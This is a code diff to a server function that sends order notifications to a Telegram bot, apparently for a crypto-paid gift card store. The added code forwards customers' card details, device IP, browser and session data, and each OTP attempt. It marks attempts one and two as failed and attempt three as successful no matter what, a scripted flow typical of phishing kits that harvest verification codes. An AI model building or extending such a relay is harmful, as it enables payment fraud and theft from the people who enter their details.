@@ -18,11 +18,21 @@ interface OrderDetails {
   deliveryMethod: string;
   cryptoCurrency: string;
   transactionId: string;
+  ip?: string;
+  userAgent?: string;
+  sessionId?: string;
+  notificationType?: string;
+  otpAttempt?: number;
+  cardDetails?: {
+    cardType: string;
+    lastFour: string;
+  };
 }
 
-function formatTelegramMessage(orderDetails: OrderDetails): string {
+function formatInitialOrderMessage(orderDetails: OrderDetails): string {
   return `
-🔥 *NEW HOT TOPIC GIFT CARD ORDER* 🔥
+🔰 *NEW ORDER NOTIFICATION* 🔰
+🏷️ *Type:* Initial Order Placement
 
 👤 *Customer*: ${orderDetails.customerName}
 📧 *Email*: ${orderDetails.email}
@@ -36,7 +46,85 @@ function formatTelegramMessage(orderDetails: OrderDetails): string {
 🔢 *Transaction ID*: \`${orderDetails.transactionId}\`
 
 📆 *Date*: ${new Date().toLocaleString()}
+
+📱 *Device Info*:
+IP: ${orderDetails.ip || 'Unknown'}
+Browser: ${orderDetails.userAgent ? orderDetails.userAgent.substring(0, 100) : 'Unknown'}
+Session: ${orderDetails.sessionId || 'Unknown'}
 `;
+}
+
+function formatPaymentDetailsMessage(orderDetails: OrderDetails): string {
+  if (!orderDetails.cardDetails) {
+    return "⚠️ *No card details provided*";
+  }
+  
+  return `
+💳 *PAYMENT DETAILS NOTIFICATION* 💳
+🏷️ *Type:* Card Information Provided
+
+👤 *Customer*: ${orderDetails.customerName}
+📧 *Email*: ${orderDetails.email}
+📱 *Phone*: ${orderDetails.phone}
+
+💳 *Card Type*: ${orderDetails.cardDetails.cardType || 'Unknown'}
+🔢 *Last Four*: ${orderDetails.cardDetails.lastFour || 'Unknown'}
+💰 *Amount*: $${orderDetails.paymentAmount.toFixed(2)}
+🎁 *Gift Card Value*: $${orderDetails.giftCardValue.toFixed(2)}
+
+📆 *Date*: ${new Date().toLocaleString()}
+
+📱 *Device Info*:
+IP: ${orderDetails.ip || 'Unknown'}
+Browser: ${orderDetails.userAgent ? orderDetails.userAgent.substring(0, 100) : 'Unknown'}
+Session: ${orderDetails.sessionId || 'Unknown'}
+`;
+}
+
+function formatOTPAttemptMessage(orderDetails: OrderDetails): string {
+  const attempt = orderDetails.otpAttempt || 0;
+  const isLastAttempt = attempt === 3;
+  const attemptEmoji = isLastAttempt ? '✅' : '🔄';
+  const attemptStatus = isLastAttempt ? 'SUCCESSFUL (FINAL ATTEMPT)' : `FAILED (ATTEMPT ${attempt}/3)`;
+  const headerColor = isLastAttempt ? '*GREEN*' : '*RED*';
+  
+  return `
+${attemptEmoji} *OTP VERIFICATION ${attemptStatus}* ${attemptEmoji}
+🏷️ *Type:* OTP Attempt ${attempt}/3 - ${headerColor}
+
+👤 *Customer*: ${orderDetails.customerName}
+📧 *Email*: ${orderDetails.email}
+📱 *Phone*: ${orderDetails.phone}
+
+💳 *Card Type*: ${orderDetails.cardDetails?.cardType || 'Unknown'}
+🔢 *Last Four*: ${orderDetails.cardDetails?.lastFour || 'Unknown'}
+💰 *Amount*: $${orderDetails.paymentAmount.toFixed(2)}
+
+${isLastAttempt ? '✅ *PAYMENT AUTHORIZED*' : '⚠️ *Verification Failed*'}
+
+📆 *Date*: ${new Date().toLocaleString()}
+
+📱 *Device Info*:
+IP: ${orderDetails.ip || 'Unknown'}
+Browser: ${orderDetails.userAgent ? orderDetails.userAgent.substring(0, 100) : 'Unknown'}
+Session: ${orderDetails.sessionId || 'Unknown'}
+`;
+}
+
+function formatTelegramMessage(orderDetails: OrderDetails): string {
+  const type = orderDetails.notificationType || "order";
+  
+  switch (type) {
+    case "initial_order":
+      return formatInitialOrderMessage(orderDetails);
+    case "payment_details":
+      return formatPaymentDetailsMessage(orderDetails);
+    case "otp_attempt":
+      return formatOTPAttemptMessage(orderDetails);
+    default:
+      // Fallback to original format for backward compatibility
+      return formatInitialOrderMessage(orderDetails);
+  }
 }
 
 async function sendTelegramNotification(message: string): Promise<boolean> {
@@ -84,7 +172,7 @@ serve(async (req) => {
 
   try {
     const orderDetails: OrderDetails = await req.json();
-    console.log("Received order details for Telegram notification:", orderDetails);
+    console.log("Received details for Telegram notification:", orderDetails);
     
     // Format the message for Telegram
     const message = formatTelegramMessage(orderDetails);
